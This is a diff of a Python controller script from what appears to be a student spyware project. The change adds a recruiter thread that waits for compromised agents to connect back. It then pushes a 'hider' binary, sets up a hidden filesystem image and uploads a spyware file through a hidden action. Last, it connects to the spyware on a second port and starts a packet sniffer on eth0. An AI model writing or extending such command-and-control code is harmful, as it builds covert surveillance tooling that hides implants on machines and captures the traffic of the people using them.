@@ -6,23 +6,40 @@ from funCode import FunCode
 from time import sleep
 from contParams import *
 from structParams import *
+from agentRecruiter import AgentRecruiter
+import threading
+import configparser
 
-# HOST = "192.168.83.131"
+
 HOST = "localhost"
 PORT_MANEGER = 65432
 PORT_SPYWARE = 65410
 
 
 def main():
-    agent = Agent(HOST, PORT_MANEGER)
     targetHiderPath = "./sentHider.o"
+
+    image_path = "fs.iso"
+    mount_path = "fs"
+
+    agents = list()
+    recrutionEvent = threading.Event()
+    recruiter = AgentRecruiter(HOST, PORT_MANEGER, agents, recrutionEvent)
+    recruiter.start()
+
+    while len(agents) == 0:
+        sleep(1)
+
+    agent: Agent = agents.pop()
+
     print(
         agent.write_file(
             "/home/avner/Arazim-Projects-2024---spyware/hider",
             targetHiderPath,
         )
     )
-    print(agent.hider_setup(targetHiderPath, 'fs.iso', 'fs'))
+
+    print(agent.hider_setup(targetHiderPath, image_path, mount_path))
 
     print(
         agent.hidden_action_with_upload(
@@ -31,9 +48,10 @@ def main():
             "sentSpyware.spy",
         )
     )
-    sleep(3)
-    spyAgent = Agent(HOST, PORT_SPYWARE)
-    print(spyAgent.hider_setup(targetHiderPath))
+
+    spyAgent = Agent.listenSpyware((HOST, PORT_SPYWARE))
+
+    print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
 
     params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
     print(spyAgent.runContraption(params, 10))
